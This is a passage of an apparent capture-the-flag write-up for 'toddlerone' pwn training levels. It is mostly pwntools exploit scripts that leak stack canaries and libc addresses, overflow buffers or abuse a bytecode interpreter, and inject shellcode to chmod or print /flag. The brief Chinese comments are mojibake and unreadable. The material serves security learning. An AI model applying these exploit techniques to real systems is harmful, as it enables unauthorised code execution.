<span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/toddlerone_level6.0&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/toddlerone_level6.0&#x27;</span>)<br><span class="hljs-comment"># debug()</span><br><br>sla(<span class="hljs-string">&quot;Payload size:&quot;</span>,<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1024</span>))<br>sea(<span class="hljs-string">&quot;Send your payload&quot;</span>,<span class="hljs-string">b&#x27;REPEAT&#x27;</span>.ljust(<span class="hljs-number">0x39</span>,<span class="hljs-string">b&#x27;a&#x27;</span>))<br>ru(<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x39</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;REPEAT&#x27;</span>)))<br>canary = uu64(<span class="hljs-string">b&#x27;\x00&#x27;</span>+rc(<span class="hljs-number">7</span>))<br><br>sla(<span class="hljs-string">&quot;Payload size:&quot;</span>,<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1024</span>))<br>sea(<span class="hljs-string">&quot;Send your payload&quot;</span>,<span class="hljs-string">b&#x27;REPEAT&#x27;</span>.ljust(<span class="hljs-number">0x38</span>+<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;a&#x27;</span>))<br>stack_addr = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br><br>sla(<span class="hljs-string">&quot;Payload size:&quot;</span>,<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1024</span>))<br>sea(<span class="hljs-string">&quot;Send your payload&quot;</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span>+p32(<span class="hljs-number">1</span>)+p32(<span class="hljs-number">0x5a</span>)+p64(canary)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0xdeadbeef</span>)+p64(stack_addr-<span class="hljs-number">0x150</span>)+asm(shellcraft.pushstr(<span class="hljs-string">&#x27;/flag&#x27;</span>)+shellcraft.chmod(<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">2559</span>)))<br>lg(<span class="hljs-string">&#x27;canary&#x27;</span>,canary)<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/toddlerone_level6.1&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/toddlerone_level6.1&#x27;</span>)<br><span class="hljs-comment"># debug(0x1A6C)</span><br><br>sla(<span class="hljs-string">&quot;Payload size:&quot;</span>,<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1024</span>))<br>sea(<span class="hljs-string">&quot;Send your payload&quot;</span>,<span class="hljs-string">b&#x27;REPEAT&#x27;</span>.ljust(<span class="hljs-number">0x49</span>,<span class="hljs-string">b&#x27;a&#x27;</span>))<br>ru(<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x49</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;REPEAT&#x27;</span>)))<br>canary = uu64(<span class="hljs-string">b&#x27;\x00&#x27;</span>+rc(<span class="hljs-number">7</span>))<br>stack_addr = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br><br><br>sla(<span class="hljs-string">&quot;Payload size:&quot;</span>,<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1024</span>))<br>sea(<span class="hljs-string">&quot;Send your payload&quot;</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span>+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">1</span>)+p32(<span class="hljs-number">0x5a</span>)+p32(<span class="hljs-number">0x7ffc</span>)+p64(canary)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0xdeadbeef</span>)+p64(stack_addr-<span class="hljs-number">0x10e0</span>)+asm(shellcraft.pushstr(<span class="hljs-string">&#x27;/flag&#x27;</span>)+shellcraft.chmod(<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">2559</span>)))<br>lg(<span class="hljs-string">&#x27;canary&#x27;</span>,canary)<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L7-7-1"><a class="header-anchor" href="#L7-7-1">Â¶</a>L7,7.1</h2><p>ä¿©é¢˜ä¸€æ ·çš„æ€è·¯ï¼Œå‰è€…æ˜¯åè€…çš„æ•™å­¦é¢˜ï¼ˆå¸¦äº†ç¬¦å·çš„è¾“å‡ºæç¤ºï¼‰ã€‚</p><p>è¶Šç•Œå†™ç›´æ¥å†™æ ˆï¼Œæ ˆæœ‰ rwx æƒé™ï¼Œæ‰€ä»¥æ¯”è¾ƒç™½ç»™ ovo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;b *0x4026B0 \n&#x27;</span><br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ll7&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./ll7&#x27;</span>)<br>debug(<span class="hljs-number">0x40204B</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"> op   reg  arg</span><br><span class="hljs-string">\x04 \x08  \x02</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>opcode = p8(<span class="hljs-number">0x4</span>)+p16(<span class="hljs-number">0x0238</span>) + p8(<span class="hljs-number">0x4</span>)+p16(<span class="hljs-number">0x20ff</span>)<br>opcode += p8(<span class="hljs-number">0x20</span>) + p16(<span class="hljs-number">0x0801</span>)<br><span class="hljs-comment"># opcode = p8(0x10) + p16(0x0201) + p8(0x20) + p16(0x0200)</span><br><br>sea(<span class="hljs-string">&quot;Good luck!&quot;</span>,opcode)<br>ru(<span class="hljs-string">&quot;[-] the saved return address is at &quot;</span>)<br>stack_addr = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>),<span class="hljs-number">16</span>)<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br>se(<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">0x6d</span>+p64(stack_addr+<span class="hljs-number">8</span>)+asm(shellcraft.read(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x100</span>)))<br>pause()<br>se(asm(<span class="hljs-string">&#x27;nop;&#x27;</span>*<span class="hljs-number">0x30</span>+shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L8-L8-1-v2"><a class="header-anchor" href="#L8-L8-1-v2">Â¶</a>L8,L8.1</h2><p>å¤šäº†ä¸ª canaryï¼Œèµ°ä¸€æ¬¡ write leak å‡ºæ¥å°±è¡Œäº†ã€‚ä¹Ÿä¸æ˜¯å¾ˆéš¾ï¼Œéœ€è¦æ³¨æ„è¦†ç›–çš„æ—¶å€™ä¸è¦æŠŠ sp ip ç­‰å…³é”®ä¿¡æ¯è¦†ç›–æ‰äº†ï¼Œä¸ç„¶å¡å¾ªç¯æŠ¥å¥‡æ€ªçš„é”™è¯¯ =ã€‚=</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"> <span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-number">0x1F8D</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/toddlerone_level8.1&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/toddlerone_level8.1&#x27;</span>)<br><span class="hljs-comment"># debug(0x189D )</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">val op+arg</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>opcode = p8(<span class="hljs-number">0xab</span>)+p16(<span class="hljs-number">0x0840</span>) + p8(<span class="hljs-number">0xff</span>)+p16(<span class="hljs-number">0x0810</span>) + p8(<span class="hljs-number">1</span>)+p16(<span class="hljs-number">0x0802</span>)<br>opcode += p8(<span class="hljs-number">0x02</span>) + p16(<span class="hljs-number">0x1020</span>)<br>opcode += p8(<span class="hljs-number">0xab</span>)+p16(<span class="hljs-number">0x0840</span>) + p8(<span class="hljs-number">0xff</span>)+p16(<span class="hljs-number">0x0810</span>) +p8(<span class="hljs-number">0</span>)+p16(<span class="hljs-number">0x0802</span>)<br>opcode += p8(<span class="hljs-number">0x01</span>) + p16(<span class="hljs-number">0x1001</span>)<br><span class="hljs-comment"># opcode = p8(0xff)+p16(0x0401) + p8(0xac)+p16(0x0408) + p8(0x1) +p16(0x0440)</span><br><span class="hljs-comment"># opcode += p8(0x2) + p16(0x0108)</span><br><span class="hljs-comment"># opcode += p8(0xff)+p16(0x0401) + p8(0xac)+p16(0x0408) + p8(0x0)+p16(0x0440)</span><br><span class="hljs-comment"># opcode += p8(0x40) + p16(0x0120)+ p8(0xac)+p16(0x0408)</span><br><span class="hljs-comment"># opcode = p8(0x4)+p16(0x02ab) + p8(0x4)+p16(0x20ff)</span><br><span class="hljs-comment"># opcode += p8(0x20) + p16(0x0801)</span><br>sea(<span class="hljs-string">&quot;Please input your yancode&quot;</span>,opcode)<br>ru(<span class="hljs-string">&quot;[+] Starting interpreter loop! Good luck!\n&quot;</span>)<br>dataa = rc(<span class="hljs-number">0xff</span>)<br>libc_leak = uu64(dataa[<span class="hljs-number">0x68</span>+<span class="hljs-number">5</span>:<span class="hljs-number">0x68</span>+<span class="hljs-number">5</span>+<span class="hljs-number">6</span>])<br>libc_base = libc_leak - <span class="hljs-number">0x24083</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br><br>stack_addr = uu64(dataa[<span class="hljs-number">0x78</span>+<span class="hljs-number">5</span>:<span class="hljs-number">0x78</span>+<span class="hljs-number">5</span>+<span class="hljs-number">6</span>])<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br>pause()<br>se(dataa[:<span class="hljs-number">0x55</span>]+p64(<span class="hljs-number">0x80000ffab00</span>)+dataa[<span class="hljs-number">0x55</span>+<span class="hljs-number">8</span>:<span class="hljs-number">0x55</span>+<span class="hljs-number">8</span>+<span class="hljs-number">0x10</span>]+p64(stack_addr-<span class="hljs-number">0xe8</span>)+asm(shellcraft.read(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x100</span>)))<br><span class="hljs-comment"># ru(&#x27;[s] ... write\n&#x27;)</span><br><span class="hljs-comment"># dataa = rc(0xff)</span><br>pause()<br><br>se(asm(<span class="hljs-string">&#x27;nop;&#x27;</span>*<span class="hljs-number">0x30</span>+shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L9-9-1"><a class="header-anchor" href="#L9-9-1">Â¶</a>L9,9.1</h2><p>é™åˆ¶äº†ä½†æ²¡å®Œå…¨é™åˆ¶.jpgï¼Œç¨‹åºè®¾è®¡æˆ‘ä»¬å¯ä»¥è¿è¡Œæ—¶è¯»å…¥ä»£ç ï¼Œè¦†ç›–æ‰åŸæ¥çš„å³å¯æ¢å¤æ­£å¸¸çš„è°ƒç”¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span 